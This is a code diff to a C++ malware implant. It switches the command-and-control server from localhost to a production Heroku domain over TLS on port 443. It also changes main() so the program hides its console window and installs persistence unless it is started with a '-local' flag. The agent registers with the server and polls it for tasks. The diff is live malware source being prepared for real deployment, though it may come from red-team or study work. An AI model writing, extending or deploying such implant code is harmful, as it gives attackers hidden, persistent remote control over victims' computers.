@@ -16,14 +16,14 @@ using json = nlohmann::json;
 // implant configurations
 
 // uncomment the following for production
-// LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
-// int port = 443;
-// BOOL useTLS = TRUE;
+LPCWSTR c2Domain = L"c2-server-app.herokuapp.com";
+int port = 443;
+BOOL useTLS = TRUE;
 
 // uncomment the following for development
-LPCWSTR c2Domain = L"127.0.0.1";
-int port = 5000;
-BOOL useTLS = FALSE;
+// LPCWSTR c2Domain = L"127.0.0.1";
+// int port = 5000;
+// BOOL useTLS = FALSE;
 
 LPCWSTR registerURI = L"/agent/register";
 LPCWSTR getTaskURI = L"/agent/get_task";
@@ -420,7 +420,11 @@ int main(int argc, char* argv[]){
         return 0; // Exit program
     }
 
-    if (argc != 2 && argv[1] != "-dev") {
+    if (argc == 2 && std::string(argv[1]) == "-local") {
+        c2Domain = L"127.0.0.1";
+        port = 5000;
+        useTLS = FALSE;
+    } else {
         FreeConsole();
         persist();
     }
